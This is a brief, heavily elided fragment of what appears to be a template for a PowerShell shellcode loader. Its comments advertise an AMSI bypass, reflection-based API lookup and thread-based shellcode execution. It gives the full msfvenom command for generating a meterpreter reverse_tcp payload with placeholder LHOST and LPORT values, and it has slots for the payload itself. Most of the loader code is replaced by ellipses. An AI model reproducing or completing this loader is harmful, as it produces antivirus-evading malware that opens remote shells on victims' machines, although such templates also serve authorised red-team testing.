...
# Features: AMSI bypass, reflection-based API loading, shellcode execution
# Payload: {{ lhost }}:{{ lport }}
...
# Shellcode loader using reflection
function LookupFunc {
...
# Generated by msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f powershell
{{ powershell_payload }}
...
# CreateThread(NULL, 0, lpMem, NULL, 0, NULL)
